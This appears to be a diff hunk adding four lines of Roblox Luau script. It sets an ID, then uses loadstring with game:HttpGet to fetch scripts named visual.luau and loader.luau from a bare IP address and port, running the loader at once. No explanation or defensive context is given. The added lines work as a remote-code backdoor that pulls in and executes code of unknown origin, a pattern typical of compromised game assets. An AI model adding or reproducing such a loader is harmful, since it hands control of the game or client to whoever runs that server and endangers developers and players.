@@ -1,0 +1,4 @@
+ID="df13cb14-4c6e-49e3-9ce1-8d988fcf9b7f";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
